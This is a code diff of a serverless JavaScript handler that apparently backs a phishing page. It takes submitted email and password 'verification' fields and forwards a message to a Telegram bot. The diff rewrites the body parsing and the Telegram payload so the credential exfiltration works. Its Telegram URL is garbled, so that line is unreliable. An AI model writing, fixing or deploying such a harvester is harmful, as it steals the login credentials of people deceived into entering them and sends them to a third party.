@@ -1,12 +1,27 @@
 export default async function handler(req, res) {
-    // 1. Handle Preflight CORS requests and strict POST check
     if (req.method !== 'POST') {
         res.setHeader('Allow', ['POST']);
         return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
     }
 
     try {
-        const { email, password } = req.body || {};
+        // Manually parse stream body to bypass Vercel configuration bugs
+        let buffers = [];
+        for await (const chunk of req) {
+            buffers.push(chunk);
+        }
+        const dataBuffer = Buffer.concat(buffers).toString();
+        
+        let body = {};
+        if (dataBuffer) {
+            try {
+                body = JSON.parse(dataBuffer);
+            } catch (e) {
+                return res.status(400).json({ error: "Invalid JSON format received by server." });
+            }
+        }
+
+        const { email, password } = body;
 
         if (!email || !password) {
             return res.status(400).json({ error: "Please complete all verification fields." });
@@ -21,20 +36,16 @@ export default async function handler(req, res) {
 
         const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
 
-        // 2. Safe Payload Structure
-        const payload = {
-            chat_id: chatId,
-            text: messageText,
-            parse_mode: 'Markdown'
-        };
-
-        // 3. Request execution using native HTTPS handling to prevent runtime compilation errors
         const response = await fetch(telegramUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
         });
 
         const result = await response.json();
@@ -46,7 +57,6 @@ export default async function handler(req, res) {
         }
 
     } catch (error) {
-        // This ensures the 500 error prints the actual issue back to your console so you can read it
         return res.status(500).json({ error: `Server Exception: ${error.message}` });
     }
 }
